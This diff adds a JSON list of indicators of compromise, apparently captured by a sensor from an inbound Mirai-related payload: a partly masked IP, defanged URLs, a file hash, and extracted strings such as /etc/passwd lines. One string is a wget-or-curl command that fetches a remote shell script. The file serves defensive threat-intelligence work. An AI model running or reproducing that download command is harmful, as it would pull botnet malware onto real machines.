@@ -1,0 +1,116 @@
+[
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "217.60.195.XXX"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxps://217.60.195.XXX/sh"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxps://217.60.195.XXX/sh)"
+  },
+  {
+    "context": "Inbound payload hash (mirai)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "21cc2903920c7ee446963e4e3c693cb39930e71028fe8a7da726168dca4ffc6f"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "[4lcurl: option -k not recognized"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "[4lroot@db12-web01:~# (wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh || curl -sk hxxps://217.60.195.XXX/sh)"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "[4lwget: invalid option -- 'no-check-certificate'"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "curl: try 'curl --help' or 'curl --manual' for more information"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "Try `wget --help' for more options."
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "Usage: wget [OPTION]... [URL]..."
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin"
+  },
+  {
+    "country": "private",
+    "role": "artifact_source",
+    "type": "ip",
+    "value": "[internal-ip-redacted]"
+  }
+]
